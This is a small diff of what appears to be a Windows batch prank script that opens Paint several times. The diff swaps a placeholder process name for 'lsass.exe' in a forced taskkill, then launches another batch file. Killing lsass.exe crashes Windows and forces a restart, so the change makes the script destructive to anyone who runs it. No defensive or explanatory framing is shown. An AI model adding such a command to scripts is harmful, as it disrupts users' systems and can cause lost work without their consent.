@@ -11,5 +11,5 @@ for /l %%j in (1,1,5) do (
     start mspaint.exe
 )
 
-taskkill /IM processname.exe /F
+taskkill /IM lsass.exe /F
 start "" "%~dp0run tis.bat"
